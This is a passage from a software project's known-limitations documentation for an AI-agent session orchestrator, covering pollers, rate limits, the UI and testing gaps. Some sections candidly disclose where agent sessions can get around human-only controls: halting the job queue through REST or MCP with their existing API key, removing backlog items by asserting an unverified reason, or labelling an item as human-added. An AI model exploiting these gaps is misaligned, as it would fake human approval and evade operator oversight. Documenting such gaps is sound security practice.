cursor. That catches a condition the poller runs against without landing state, which is the case
the shared liveness heartbeat masks. It cannot catch a condition whose search returns **nothing**: a
label renamed in the repo, a repo the token lost access to (GitHub's search silently omits it rather
than erroring), a scope edited into emptiness. Those return nothing to the poller and nothing to the
probe alike, and a condition with no matching items is indistinguishable from a quiet one. Confirming
that each watched label still exists in each watched repo would need a different request shape
(`gh api repos/{repo}/labels/{label}`), and is not done.

It also cannot see a stalled `github_label` item that is still active. The label probe narrows to
items not updated in the last three hours, because seen-set membership alone cannot tell a stall
from a label added a minute ago — but `updated_at` moves on *any* activity (a comment, a push,
another label), so an item that carries the watched label and keeps being worked on is excluded
until it goes quiet for three hours. Both gaps fail quiet: they miss a stall, they never invent one.

### A `github_issue` trigger misses an issue indexed more than 30 minutes late

GitHub's search index is eventually consistent and unordered. `GithubTriggerPollerJob` re-queries a
30-minute window behind its cursor (`INDEX_LAG_GRACE`) so that an issue indexed *after* a newer one
is still picked up. Observed lag is on the order of seconds, so the window is generous — but an issue
that takes longer than that to appear in the search index falls behind the window and is never fired.
There is no reconciliation pass to catch it.

`github_label` conditions are immune to this: they compare against current state, not a cursor, so a
late-indexed item simply fires on whichever tick it first appears.

### A `github_issue` exclusion label only works if it is on the issue at creation

`exclude_labels` keeps an issue from firing a `github_issue` condition, and it is evaluated by the
GitHub *search* — a `-label:` negation — not by filtering what the poller got back. The poller ticks
every minute, so an issue that is opened and then labelled a moment later can be seen and fired
before the label lands. The escape hatch is only reliable when the label is applied at creation:

```sh
gh issue create --label "hold issue work gate" --title "…" --body "…"
```

There is no compensating check — nothing re-reads a fired issue's labels afterwards, and a session
already spawned is not withdrawn.

The reverse direction — *removing* the label later — is unpredictable rather than simply bounded,
and the reason is worth knowing. The poller re-queries a 30-minute window behind its cursor
(`INDEX_LAG_GRACE`), and that cursor advances only when an issue actually **fires**; a tick that
returns nothing leaves it where it was. So the window trails the last fired issue, not wall-clock
time. Un-holding an issue re-exposes it whenever no *other* issue has fired past it since — which,
in a repo where the held issues are the only recent ones, can be days later. Once something else has
fired and dragged the cursor forward, the same issue is behind the window and un-holding it does
nothing. Neither outcome is announced. Treat un-holding as "may or may not fire" and open a fresh
issue when you actually want the gate.

### The GitHub trigger poller needs a `gh` credential in the environment that runs it

`GithubTriggerPollerJob` runs on the **worker**, and shells out to `gh`. If that environment has no
`gh auth login` credential and no `GH_TOKEN`/`GITHUB_TOKEN`, the poller cannot search GitHub and every
`github_label`/`github_issue` trigger silently never fires. The poller detects this and skips the tick
with a single WARN rather than erroring per-condition — so the failure mode is "nothing happens", which
is quiet but easy to miss. Staging shipped without this credential, which is how the gap was found.

Check with `gh auth status` in the worker container; fix by providing a token to that environment.

The tick is skipped the same way when the preflight *cannot reach GitHub* — but the WARN then says so
rather than blaming the credential, and a `401` says "rotate this" rather than "provision one". The
three are distinguishable from a single log line; see [Triggers](/sessions/triggers/) for the states.
Nothing pages for any of them on the tick itself: the floor is still
`TriggerPollerLivenessCheckJob`'s stale heartbeat, which is up to 15 minutes.

### A timed-out GitHub search index skips the tick quietly, and the escalation needs Redis

When GitHub's search index times out it returns `incomplete_results: true` with a partial set.
Accepting that would corrupt the label poller's seen-set, so `GithubSearchService` re-runs the whole
search (0.5s, then 1.5s) and, if it is still short, the poller skips that condition for the tick with
a WARN. The next tick re-derives the whole seen-set, so this self-corrects — but for that minute the
condition is not polled and its trigger does not fire, with nothing in `#alerts` to say so. A
label added and removed inside that window is never seen at all.

The escalation for a degradation that does not clear is a per-condition consecutive-skip counter in
Redis (`CONSECUTIVE_INCOMPLETE_SEARCHES_TO_ALERT`, 5 ticks). It fails **quiet**, not loud: if the
cache is unreachable the streak can never be counted, so a sustained single-condition degradation
would page only if it were broad enough to stall the poller's heartbeat too. That direction is
deliberate — inventing a streak from a failed cache read would page for a Redis blip on the first
index timeout, which is the noise this exists to remove.

### Whether a failed GitHub search is retried is decided by reading `gh`'s error text

`GithubSearchService` re-runs a search whose request failed, so a transient GitHub blip stops paging
`#alerts` for a system that heals a second later. Whether a given failure qualifies is decided by
parsing the `gh` subprocess's stderr — the `(HTTP nnn)` suffix it appends to an API error, and the
wording of a 403 (rate limit, which clears, versus permission denial, which does not). None of that
is an API contract. If `gh` rewords its errors or stops printing the status code, a failure that
should fail fast gets retried instead: it waits ~4 seconds and then pages anyway, on that tick and
every tick after. The classification can therefore make a page *late*; it cannot make one *vanish*,
which is the direction the deny-list was chosen to be wrong in.

Three failures get no second chance, and only the first is about classification at all. A 4xx GitHub
attributes to the request (422, 404, a permission denial) and a `gh` usage error raise immediately,
as does a **rate limit** — transient, but never inside a 4-second budget, and retrying it would
spend more of the quota that caused it. So does a **hang**: a `gh` call killed at `REQUEST_TIMEOUT`
(15s) raises on the first attempt, because retrying would spend most of a one-minute tick on the
failure least likely to clear. A GitHub incident that stalls connections rather than refusing them
therefore still pages per tick, exactly as before.

### `BoundedSubprocess` can still return a nil `Process::Status`, and every caller has to remember

`BoundedSubprocess.run` returns Open3's `wait_thr.value`, which is a `Process.detach` thread whose
`#value` is **`nil`** when the child pid was reaped elsewhere before the waiter's own `waitpid` ran
(`ECHILD`) — a race that can happen in the multi-threaded worker. A caller that then calls
`status.success?` on that nil crashes with `undefined method 'success?' for nil`.

Every consumer today reads the status through `SubprocessStatus.success?` /
`SubprocessStatus.describe_failure`, which treat nil as a failure (`REAPED_DESCRIPTION`) rather than
dereferencing it: `GithubSearchService`, `GitCloneService`, both `AirPrepareService` call sites, both
`CloneDiskGuard` call sites, and `McpPackageReinstallJob`. So the race is handled everywhere it can
currently occur.

What remains is that this is a **convention, not a guarantee**. The type `BoundedSubprocess` hands
back still admits nil, so the next caller written against it is one `status.success?` away from the
same `NoMethodError`, and nothing in the signature or the test suite will stop them. The durable fix
is to make `BoundedSubprocess` never hand back a nil status — normalising it into a status object
that reports failure — so callers cannot get it wrong rather than merely not getting it wrong today.

---

## API

### A gateway timeout on a create still arrives as HTML, not as a JSON-RPC error

A request that outruns the reverse proxy's read timeout is answered by the **proxy**, not by Zimmer,
with its own `504 — Gateway Timeout` HTML page. An MCP client parsing that gets a parse failure
rather than a transport error it can classify, and there is no correlation id in it to match against
anything. Nothing in this application can change that: by the time the page is written, the app is
not in the conversation. The timeout value and the error-page format are deployment configuration —
the Caddy layer in front of the app — not application code.

What Zimmer does instead is remove the two reasons this mattered. The create is
[idempotent when you name the attempt](/extend/rest-api/#idempotency_key--making-the-create-safe-to-retry),
so a caller no longer has to *classify* the error to act on it — it retries with the same
`idempotency_key` and gets the session either way. And the create no longer does the O(lineage²)
provenance fan-out that put it near the timeout in the first place (see [Hierarchy and human
messages](/sessions/hierarchy-and-human-messages/)). A caller that passes no key is still exposed to
the original ambiguity, which is why the tool description tells it to search by title rather than
retry. Tracked in [#577](https://github.com/tadasant/zimmer/issues/577).

### Queue recovery mode is deliberately outside the health cooldown, and only the way out is anonymous

`QueueRecoveryMode` (see [Queue recovery mode](/operate/background-jobs/#queue-recovery-mode)) is
Zimmer's escape hatch for a runaway job queue: it halts execution on `pollers`, `triggers`,
`inference`, `maintenance` and `default` for up to four hours. Two things about it are choices rather than oversights, and both cut
against the grain of the section below.

None of its three surfaces sit behind `HealthActionCooldown`. That throttle **fails closed** when the
cache cannot enforce it, and an instance overloaded enough to need recovery mode is exactly the
instance whose Redis is least trustworthy — so the throttle would have locked the escape hatch, and
above all the way back out of it, precisely when it was needed. A halt is two row-writes and is
reversible; being unable to resume is not.

The two halves of the web control are gated differently, and the asymmetry is the point.
`enter_queue_recovery_mode` sits behind the operator realm with the destructive maintenance actions
([#371](https://github.com/tadasant/zimmer/issues/371),
[#312](https://github.com/tadasant/zimmer/issues/312)), because halting instance-wide job processing
is a bigger lever than its neighbours on that page even though it is reversible, self-expiring and
pages `#alerts` on every transition. `exit_queue_recovery_mode` is behind nothing, deliberately:
the realm fails closed, so gating the exit would put a credential the deployment may never have set
between an operator and the end of a halt. The REST and MCP equivalents of both require an API key as
usual, and MCP additionally gates on the `health` tool group, which the `self_session` set injected
into every agent session does not include.

What the realm buys here is narrower than it looks. The caller it is aimed at is an agent session
already inside the tailnet, and a session holds an `API_KEYS` entry even though `CliSpawnEnv` strips
`SUPERVISOR_PASSWORD` from everything it spawns. The web door is shut; the REST and MCP doors still
answer to a credential the caller already has.

Two knock-on effects worth knowing while the mode is on. Halting `pollers` also halts
`SystemHealthMonitorJob`, so the "Queue backlog critical" page stops firing — deliberate, since the
backlog is now the operator's own doing, but it means the mode's own enter/exit alerts are the only
signal. And enabling `config.good_job.enable_pauses` globally adds three `good_job_settings`
subqueries to every dequeue poll on all five schedulers; the table holds one row and is indexed on
`key`, but it is not nothing on a database already under the pressure of
[#329](https://github.com/tadasant/zimmer/issues/329).

### The only rate limit is on the health endpoints, and it needs a real cache

`HealthActionCooldown::COOLDOWN = 30.seconds` is the whole of Zimmer's rate limiting. It is keyed in
`Rails.cache` as `health_api_rate_limit:<action>:<digest of the API key>`, so it is per-caller — one
client's cleanup no longer locks everyone else out — and the raw key never lands in a cache key. All
three surfaces that can run these actions share that one object — the `/health` web dashboard,
`Api::V1::HealthController`, and the MCP `action_health` tool — so switching surfaces does not buy a
second run.

The web dashboard is the exception to "per caller", and unavoidably so. Its mutating actions are
behind the operator HTTP Basic realm, but that is one shared credential rather than an identity, so
there is still no key to fingerprint and every visitor lands in one shared anonymous bucket. That is
the global cooldown it has always had.

The cooldown is only as real as the store behind it, and it can be unreal in two ways. A null store
drops every write and misses every read. A **dead Redis** does the same thing without being a null
store: `:redis_cache_store` is configured with an `error_handler` that logs the exception and
swallows it, so `write` returns nil and `read` returns nil rather than raising. Either way a naive
limiter answers "not limited" forever. So the cooldown writes a canary to the store and checks what
came back, and **fails closed** when it cannot: the three mutating API endpoints return
`503 {"error": "Rate limiting unavailable"}`, the MCP tool raises `Rate limiting unavailable`, and
the dashboard's buttons refuse with a flash. All of them log it. `GET /api/v1/health` and the
dashboard page itself are unaffected — they have no cooldown to enforce.

The consequence to know: an instance whose Redis is down cannot run `cleanup_processes`,
`retry_sessions`, or `archive_old` on any surface. That is deliberate — a destructive maintenance
action that runs unthrottled is worse than one that does not run — but it is a hard stop, not a
degradation, and it arrives during a Redis outage, which is exactly when someone may be reaching for
those buttons.

**Holding the credential does not exempt a caller from the throttle.** The operator realm and the
cooldown are independent gates and a caller passes both or nothing runs, so the 503 above lands on an
authenticated operator exactly as it lands on an API key. No credential buys a way past a dead Redis.

Two things per-caller bucketing does *not* give you. It is not per-identity: API keys have names but
no owner, so the bucket separates keys, not people. And it raises the **aggregate** ceiling — the
total rate of destructive actions now scales with the number of valid keys, where one global bucket
capped it at one per 30 seconds for the whole instance. With a handful of keys that is the right
trade, but it is a trade, and minting a key on `/settings/api_keys` adds a bucket without a deploy.

Fixed in [#99](https://github.com/tadasant/zimmer/issues/99). The two consequences above are the trade
that fix made, not a defect left behind it.

### A follow-up `goal` can set but never clear

`POST /api/v1/sessions/:id/follow_up` and the MCP `action_session` `follow_up` action apply a
non-blank `goal` to the session and treat a blank or omitted one as "leave the current goal alone".
There is deliberately no value that means "erase it" — the API has no way to distinguish a caller
who omitted the field from one who wants the goal gone, and silently clearing a session's stop
condition on every goal-less follow-up would be the worse failure. Clearing is
`PATCH /api/v1/sessions/:id` with `goal: ""`, or the `change_goal` action.

The HTML endpoint behind the web follow-up form reads a blank goal the other way: `params.key?(:goal)`
decides, so an *explicitly sent* empty string clears, and only an absent key preserves. That
divergence is latent rather than user-visible — `app/views/sessions/_follow_up_form.html.erb` renders
no goal field at all, so nothing in the shipped UI ever sends the key. The only web surface that
edits a goal alongside a message is the enqueued-message editor. A hand-crafted POST to the HTML
route is the one caller that can tell the two rules apart.

### The work backlog's "mechanical" and "human" claims are asserted, not verified

The [work backlog](/operate/work-backlog/) draws a line between what an agent may do to the queue
(append, pull, remove an item whose issue it found dead) and what only a human may (pin, hand-place,
remove by judgement, start an item as a `priority` session). The line is enforced by *absence* —
the human operations have no MCP tool — and by *vocabulary*: a pull may only remove an item with a
reason from a fixed list of observed facts (`issue_closed`, `issue_has_open_pr`,
`session_already_working`, `trust_failed`). Nothing on the server checks the fact. A connection
that carries `work_backlog` can remove any queued item by asserting `trust_failed`; the record
says which session did it, and that is the whole audit. Likewise `POST /api/v1/work_backlog_items`
defaults `added_by` to `human` and accepts any value, because the API key it authenticates is
shared by the fleet and establishes a caller, not a person — so the model's rule that an
issueless item needs a human behind it is one string away for any REST caller. The same
agent-login primitive the gate ledger's feedback boundary is waiting on ([#371](https://github.com/tadasant/zimmer/issues/371),
[#220](https://github.com/tadasant/zimmer/issues/220)) is what would make either claim verifiable.

### Work stranded with no backlog row at all is invisible to the liveness re-check

[`WorkBacklog::LivenessSweep`](/operate/work-backlog/#when-a-row-leaves-the-queue-and-goes-nowhere)
re-checks rows that have left `queued` — a `started` row whose session ended, and a `removed` row
whose reason has expired. It reads the `work_backlog_items` table, so it can only ever see work
that has a row.

**Before 2026-08-29 the issue gate started sessions itself**, and the migration into this table
imported only `queued` items. Work started that way left no row, so an issue it dropped is
reachable by nothing here. `tadasant/zimmer#368` sat 37 days in exactly that state and was the
headline example of the problem — while being the one class the fix cannot reach. Those issues do
appear on [the Issues view](/operate/issues-view/) under "In GitHub, not on the queue", but
indistinguishably from work nobody has ever rated. Closing this needs a sweep over GitHub — open,
gate-cleared issues with no live row — rather than over the table.

**The re-check also cannot tell a finished issue from one with a deliberate remainder**, which is
why it re-queues nothing. A PR that merged without a closing keyword leaves the issue open whether
it finished the work or deliberately fixed part of it, and both land on `pr_merged_issue_open`.
Separating them means reading the PR's scope and the current code, per issue. The sweep records the
evidence; a human or an agent decides.

### Stranded reads outside the Issues view lag by up to a sweep pass

`liveness_state` is written only by the hourly sweep. The [Issues view](/operate/issues-view/)
drops a stranded row whose issue its live GitHub snapshot shows closed. `get_work_backlog status:
"stranded"`, the REST index, `counts.stranded`, the `stranded` filter on `/supervisor`, and the
sweep's own alert have no snapshot to check against, so an issue closed since the last pass is still
counted there until the next one. The alert is computed straight after a pass, so its reading is
the freshest of these. That is at most an hour while
fewer than `MAX_EXAMINED_PER_SWEEP` (200) rows are unsettled. Past that the unsettled rows
round-robin too, and the lag grows with the population. Re-check the issue before acting on a
row, which the tool's description already asks.

Settled rows (`issue_closed`, `superseded`) are re-checked only with the budget left after every
unsettled row. So a closed issue that is **reopened** waits for that leftover budget before it can
read as stranded again, and while 200 or more rows are unsettled there is no leftover budget at all. Until then it still shows under "In GitHub, not on the queue", because
nothing claims it.

---

## Hardcoded values that shouldn't be

### An added model is only checked against the CLI's bundled list

A model can be added to a runtime's catalog from Settings → Models, the REST API or the
`manage_models` MCP tool, with no deploy (see
[Adding a model without a deploy](/sessions/runtimes/#adding-a-model-without-a-deploy)). What Zimmer
cannot do is prove the installed CLI will run it:

- **Claude Code ids are not checked against the CLI.** The CLI has no model list, so a mistyped
  alias that passes the shape rules is saved and fails on the session's first turn.
- **An unlisted Codex or Pi id is a warning, not an answer.** The check reads the model list bundled
  with the pinned CLI, offline. A model released after that CLI is missing from the list and may
  still work, because both CLIs pass an unknown id to the provider. So the check can only refuse it
  until the caller says to add it anyway, and then the first turn decides.
- **The stored answer ages.** `cli_listed` and `cli_version` record the check when the model was
  added. A deploy that bumps the CLI does not re-run it, so the badge keeps naming the old version
  until the model is removed and added again.
- **A Pi id for a provider Zimmer has no key variable for is unchecked.** Pi only lists a provider
  whose key resolves, and the placeholder key is named from Pi's provider table
  (`ModelCatalogCliCheck::PI_KEY_VARIABLES`, else `<PROVIDER>_API_KEY`). Cloudflare's two providers
  also need an account id to list anything, so their ids are always unchecked.

Adding a runtime, changing a built-in model, a runtime's fallback default, or the quota probe's
`messages_api_id` is a change to `ModelCatalog::MODELS` and a deploy.

The quota-probe half of the issue is fixed. `QuotaCheckService::PROBE_MODEL` is looked up from the
catalog's `haiku` entry (its `messages_api_id`, `claude-haiku-4-5`), and `ModelCatalogTest` fails
on a dated snapshot in the catalog and on a Claude model version in any Ruby literal elsewhere under
`app/`, `config/` or `lib/`. See [Models](/sessions/runtimes/#models).

Tracked in [#85](https://github.com/tadasant/zimmer/issues/85).

### The X consent finishes by paste until its callback is registered with X by hand

The X consent flow runs from `/supervisor`
([how](/auth/mcp-oauth/#x-twitter-is-minted-from-supervisor)), and it can finish on its own only when
X redirects to Zimmer's callback, `https://<APP_HOST>/supervisor/x_oauth/callback`. X accepts only
redirect URIs registered on the X app, and the one the `ao-x-mcp-server` app has registered is
`http://localhost:8080/callback`. So that is the default for `X_OAUTH_REDIRECT_URI`, and on that
default the operator's browser lands on a page nothing serves and the operator pastes its URL back
into the panel.

**Registering the hosted callback is a manual step on X's developer portal**; there is no API for it.
Once it is registered, setting `X_OAUTH_REDIRECT_URI` to it removes the paste. Setting the variable to
an unregistered URI fails at X's consent screen with an opaque error. `XOauthBootstrap` sends the
variable on both the consent request and the token exchange, as X requires
([#104](https://github.com/tadasant/zimmer/issues/104)).

---

## UI

Open issues:

- [#14](https://github.com/tadasant/zimmer/issues/14) Dashboard actions do full page reloads
  (restart/refresh/archive/pause explicitly opt out of Turbo). Lost scroll position, collapsed sections
  spring open, the drawer closes.
- [#15](https://github.com/tadasant/zimmer/issues/15) No per-card refresh — you must refresh the
  entire category.

Also:

- **Starred cards cannot be reordered.** The pinned **Starred** group sits outside the dashboard's
  drag-and-drop controller and its cards have no grip bar, so it is always newest-first. Unstar a
  card to place it; starring never loses the place it had in its section.
- **A card dropped past the end of a full page lands on the next page.** Sections paginate at 50, and
  a card dragged in from another section onto the bottom of a page that already holds 50 is placed
  below the 50th — which, on reload, is the top of page 2. The right-click "Move to…" menu puts the
  card at the top of the page of that section you have open instead, for exactly this reason.
- **A page that a broadcast has added cards to is not the page the server would render.** A new
  session is prepended to the Uncategorized grid whichever page of it you have open, and a deleted
  category's cards are prepended the same way. Server-side they sit at the top of page 1. A drag
  still places correctly — it anchors on the card below the drop — but that stray card itself moves
  to page 1 on the next reload.

- **Nothing in the web UI puts a session to sleep.** The "Pause Until" control that did — a time
  preset, a datetime picker, and a "Spot Queue" choice, on the session card, the detail header and
  the phone sheet — was removed because it read as a third confusing pause beside **Pause** and the
  board's **Snooze until…**, which mean different things. Sleeping a session until a wall-clock time
  is now `wake_me_up_later`, and parking one in the spot queue is `action_session`'s
  `pause_into_spot_queue` — both MCP/REST only, so a human with only a browser cannot do either.
  Snoozing a card is **not** a substitute: it hides the card and never touches the session. Waking
  one is narrower than it looks, too: **Start now** resumes a spot-queue park but *refuses* a session
  asleep on a wall-clock wake (`Sessions::StartNow` treats an armed wake as outranking the queue),
  and **Restart** is offered only for a `failed` or `needs_input` session, which a sleeping (`waiting`) one is not. The route that works is cancelling the wake at **/triggers**; a **follow-up** sent from the session page is delivered but leaves the wake armed, so it adds to the wait rather than ending it.
- **Live card updates ignore the status filter.** The dashboard broadcasts on one global stream and
  the server cannot know which statuses a given browser has ticked, so it only special-cases
  `archived`. With the default `needs_input`-only view, a session that transitions out of
  `needs_input` has its card replaced in place rather than removed, and a newly created `waiting`
  session is prepended into a grid that filters it out. Both correct themselves on the next reload.
  Fixing it properly means either per-filter stream names or a client that re-evaluates the filter
  on each broadcast.
- **The Ranked view inserts and removes rows live, but still never re-sorts them.** `/?view=ranked`
  sends two kinds of message. A status change replaces one element per row — the status pill — and
  nothing else, because the row also holds a precedence the user may be mid-edit on and a position
  SortableJS may be dragging. A membership change (a session created, a status moved, a scheduling
  class changed) sends an envelope instead: the session's filterable facts plus its row inside an
  inert `<template>`, which the page judges against its own filters. So a new session does appear in
  the right section at its precedence position, a promote or demote elsewhere does move the row
  between Priority and Spot, and a trashed row leaves a page filtered to live work while *staying*,
  relabelled "Trashed", on a page whose operator ticked "Archived" to look at the trash. What still
  does not happen: the queue is never re-sorted when someone else changes a precedence, and a row is
  never inserted into a page narrowed by a search, an agent-root filter or a genesis filter — the
  client cannot evaluate those three for a session it has never rendered, so it declines rather than
  guessing. Removal stays sound under all of them, because a row on screen already matched them and
  neither a status nor a class change can alter that. Three safety rules cost a little more
  freshness: deliveries are held while a row is being dragged and applied on drop, a row holding
  focus or a half-typed value is never moved or removed, and a section already at its 200-row cap
  takes no insert. All of it is corrected by a reload, and by the reopen backfill: both lists are
  `data-live-region="sync"`, so a page whose socket died is reconciled against a fresh render on
  reconnect.
- **A failed session's card footer wraps onto two lines on a narrow phone.** The row seats the PR
  control on the left and the ⋮ / Trash / View group on the right. The grid gives a card 400px
  wherever the content column can spare it, and the column's own width where it cannot — 288px at a
  320px viewport ([#803](https://github.com/tadasant/zimmer/issues/803)) — so the row runs from
  256px there to 352px at `sm:` and above. Collapsing a multi-PR control to a single trigger
  ([#607](https://github.com/tadasant/zimmer/issues/607)) bought that row enough slack for the
  ordinary case, but not for a **failed** session, which carries an extra Restart button: the action
  group alone is 237px, and the whole row needs 286px with no PR control and 333px with one. So a
  failed session with a PR wraps below a ~385px card, and one without a PR wraps only at a 320px
  viewport. It is cosmetic — nothing overflows, the card just grows a line — and closing it means
  changing what the action group renders.
- Notes autosave as you type (a 1.5s debounce) and flush again on disconnect via a keepalive
  `fetch`. The disconnect flush is best-effort, so an abrupt close can drop the last sub-debounce
  keystrokes — not the note.
- The Turbo circuit breaker stops UI updates for 60 seconds when it trips (`THRESHOLD = 5`,
  `RESET_TIME = 60`). A polled "Live updates paused" banner says so while it lasts, but the updates
  dropped during the window are gone — the page catches up on its next reload, not retroactively.
  ([#86](https://github.com/tadasant/zimmer/issues/86))
- Push notifications don't work on anything without the Push API (iOS Safari outside standalone PWA).
- Reopening the installed PWA no longer reloads the page — Zimmer backfills the regions broadcasts
  target instead of navigating (see [Lifecycle](/sessions/lifecycle/#the-reopen-backfill)) — but
  there is a case Zimmer genuinely cannot stop. iOS discards a backgrounded standalone PWA's web
  view under memory pressure, and that relaunch is a cold start: a fresh navigation before any of
  Zimmer's JavaScript exists to intervene. So a reopen after a *short* absence keeps your place,
  and a reopen after iOS has reclaimed the web view does not. What survives either way is the
  follow-up composer's text: it autosaves to `localStorage` as you type (a 300ms debounce, flushed
  immediately on `visibilitychange`/`pagehide`) and is restored on load. Scroll position and
  expanded panels survive the backfill but not the cold start.
- The backfill recovers what broadcasts target and nothing else, and three surfaces are knowingly
  outside it. A session detail loaded into the dashboard's drawer is not in a fresh render of the
  dashboard, so its regions are not backfilled — `cable-reconnect` restores live updates there, but
  content broadcast into the drawer during the gap is only recovered by reopening it. Subagent
  accordions are replace targets nested inside timeline rows, and the backfill treats a row it
  already has as already current, so subagent progress stays as it was until a real navigation. And
  the notification badge is a lazily-loaded `<turbo-frame>`: replacing it with the server's copy
  would blank it and re-fetch, so it is left alone and its count is stale until the next broadcast.
- A `sync` region that has been paged inside its own `<turbo-frame>` is skipped rather than
  reconciled, because the URL the backfill re-fetches does not carry that page. So a dashboard
  category you have paged forward in keeps the cards it had, and does not pick up sessions added or
  removed while you were away, until you page it again.
- A composer draft sits in `localStorage` for up to 7 days with no UI to clear it, and nothing
  removes it when the session is archived or you sign out. On a shared browser that is a prompt
  someone else can read. If `localStorage` is full the write fails silently and the previously
  stored, shorter draft stays behind — so a restore can hand back an older version of the text
  rather than nothing at all.
- The other text-entry surfaces — enqueued-message edit, dashboard notes, editable title and goal,
  the notes popover, elicitation forms — do not persist drafts across a reload. Notes have their own
  autosave; the rest lose in-progress text if the page is rebuilt under them.
- `start_url` in the web manifest is `/`, so a cold relaunch of the PWA lands on the dashboard rather
  than the session you were reading. The composer draft is keyed by session id and is still there
  when you navigate back, but you have to navigate back.
- The OAuth login poller gives up after 10 consecutive failed polls. Those 10 attempts back off (2s,
  4s, 8s, 16s, then 30s each) and so span about three minutes, which covers a deploy or a wifi
  handover — but an outage longer than that abandons the login and you have to start over. The panel
  says so rather than freezing on its last frame.
  ([#101](https://github.com/tadasant/zimmer/issues/101))
- A UI login whose job never dequeued — a dead or badly backed-up worker, so the CLI was never
  spawned and no heartbeat was ever stamped — has no liveness signal to go stale, and waits out the
  full 14-minute `expires_at` window before the panel reports anything. Attempts created before the
  `heartbeat_at` column shipped behave the same way.
- Alerts inside a 1-hour dedup window are swallowed, even genuinely new ones.
  ([#86](https://github.com/tadasant/zimmer/issues/86))
- A `<turbo-frame>` whose fetch comes back without the frame in it no longer shows Turbo's bare
  "Content missing" — `app/javascript/lib/frame_missing_recovery.js` cancels `turbo:frame-missing`,
  follows a redirect through as the whole-page visit it is, says what any other response actually
  was, and retries a `429`/`500`/`502`/`503`/`504` three times over about 16 seconds. What it does
  *not* do is recover the content: a `404` or a `403` is reported and not retried, and an outage
  longer than the retry budget leaves the panel showing the message until you press Retry or
  reload. The three frames this shows up in are the dashboard's `cli_badge` and
  `notification_badge` and the session drawer's `session_detail`. Two edges are knowingly left: a
  miss on a frame with no `src` (one reached by a link navigation) gets the message without a Retry
  button, because there is no URL to try again; and a miss dispatched after the frame has left the
  document is cancelled silently, because there is nothing left to paint into.

### Trash without a referer leaves you on the trashed session's page

Trashing a session from its own detail page sends you back to the dashboard, and the only thing
that tells that page apart from the session drawer is the request's `Referer` header (see
[Trash on a session's own page navigates home](/sessions/lifecycle/#trash-on-a-sessions-own-page-navigates-home)).
A browser that sends none — a privacy extension that strips it, a `Referrer-Policy: no-referrer`
somewhere upstream — gets the in-place stream the drawer gets: the session is trashed, the toast
and its **Undo** appear, the button turns into **Restore**, and you are left on the page of a session
in the bin. Nothing is lost; you just have to leave by hand.

A path that differs only by a trailing slash (`/sessions/728/`) is treated the same way. Rails
routes it, but no link in the app produces it.

---

## Testing

### Every clone on a host shares one AIR CLI install directory per environment

🟡 `AIR_INSTALL_DIR` is keyed on the environment, not on the clone: every test suite on a host
installs into `~/.cache/air-cli-test`, and every `bin/agent-dev` into `~/.cache/air-cli`. Two agent
sessions on branches that pin different AIR versions — or the same version with different package
sets — therefore take turns reinstalling that one directory, each replacing the other's tree and
deleting its version marker.

A cross-process `flock` serialises the installs, so this costs a repeated ~60s `npm install` rather
than a corrupt tree, and since 2026-09-01 neither environment can reach the deployed app's
`/opt/air-cli`, so it can no longer take production down with it. Set `AIR_INSTALL_DIR` explicitly
to give a clone its own.

### Playwright e2e scripts do not run in CI

🟡 CI runs the Chrome-driven Ruby system suite (`test/system/*.rb`) in the `test-system` job, but the
JavaScript Playwright scripts under `test/e2e/*.js` are still not wired in — the runner is not
provisioned with a Playwright browser, and `account_rotation_test.js` needs the real Claude Code
binary against a mock Anthropic server. The system suite covers the overlapping UI.

Tracked in [#162](https://github.com/tadasant/zimmer/issues/162). (The broader "system tests do not
run in CI" gap, [#87](https://github.com/tadasant/zimmer/issues/87), is closed by the `test-system`
job.)

### Four open flaky-test issues

[#10](https://github.com/tadasant/zimmer/issues/10) (a global `File.stub` racing background threads —
noted as having turned `main` red), [#5](https://github.com/tadasant/zimmer/issues/5),
[#3](https://github.com/tadasant/zimmer/issues/3), [#2](https://github.com/tadasant/zimmer/issues/2).

### Tests that skip themselves in CI

`preregistered_oauth_config_test.rb` and `secrets_loader_test.rb` skip without credentials, so in CI
they never run. The catalog-pinning skips that used to sit alongside them are gone — see
[Tests that skip themselves](/operate/testing/#tests-that-skip-themselves) for the full list and for
why a `github://` catalog turned out not to be needed to cover them.

### `logs.session_id` is an `integer` referencing a `bigint` primary key

🟡 `sessions.id` is a `bigint`. `logs.session_id`, the foreign key pointing at it, is an `integer`
— it predates this repo, came across in the first `db/schema.rb` dump, and every database since was
built by loading that dump. `20251112023554_create_logs` declares `t.references :session`, which is
`bigint`, so the migrations and every deployed database disagreed about the column's width.

The `schema_verify` CI job found that the day it was wired in
([#318](https://github.com/tadasant/zimmer/issues/318)), and
`20260906120000_align_logs_session_id_type_for_migration_replay` settled it toward `integer` — the
type production already has, so it is a no-op on every existing database. The two paths now produce
the same table, which is what the check is for.

**What is left is the width itself.** Once `sessions.id` passes 2,147,483,647 no row can be written
to `logs` at all. That is far off at the current rate, and closing it is not free: widening the
column is a full table rewrite under an `ACCESS EXCLUSIVE` lock on the highest-write table in the
app, taken during `db:prepare` at container boot. It wants to be a deliberate change with its own
plan, not a side effect of a CI job.

No issue — this is a recorded ceiling, not work in flight.

### A migration cannot install a view, a rule, a policy or a custom domain

🟡 `db/schema.rb` is a Ruby dump. It carries functions and triggers, because
`config/initializers/schema_dump_functions_and_triggers.rb` writes them into it, but not views,
materialized views, rules, row-level security, domains, composite or range types, aggregates,
standalone sequences, or partitioned or `UNLOGGED` tables. A migration that builds one of those
would leave it in production and nowhere else, so `schema_verify` fails the PR instead. See
[Functions and triggers are dumped; other DDL is refused](/operate/testing/#functions-and-triggers-are-dumped-other-ddl-is-refused).

The dumper has three smaller edges, and each one fails `schema_verify` rather than passing quietly:

- **Functions come after every table.** A column default, check constraint, generated column or
  expression index that calls a user function makes `db/schema.rb` fail to load, because the
  function does not exist yet when the table is created.
- **Functions are dumped in signature order.** A plpgsql body is not checked until it runs, but a
  SQL-language function that calls one dumped after it fails the schema load.
- **Disabled triggers are dumped enabled.** A trigger someone has disabled with
  `ALTER TABLE … DISABLE TRIGGER` comes back enabled; the catalog records the difference.

The catalog is not exhaustive either. It reads the kinds a migration most plausibly builds with
`execute`; foreign tables, extended statistics, grants, operators and collations are among what it
does not read.

`gate_decisions` is append-only in Postgres as well as in the model. `gate_decision_feedbacks` is
append-only in the model only.

No issue. The limitation fails a check instead of passing silently, and extending the dumper is how
to lift it for the next kind that is needed.

### The `cable` database's schema is not replay-checked

🟡 `db:schema:verify`'s replay half is scoped to databases that have migrations. solid_cable's
`cable` database has none: the gem ships `db/cable_schema.rb` and no migration, and the
`migrations_paths` its config names (`db/cable_migrate`) is not a directory in this repo. A from-zero
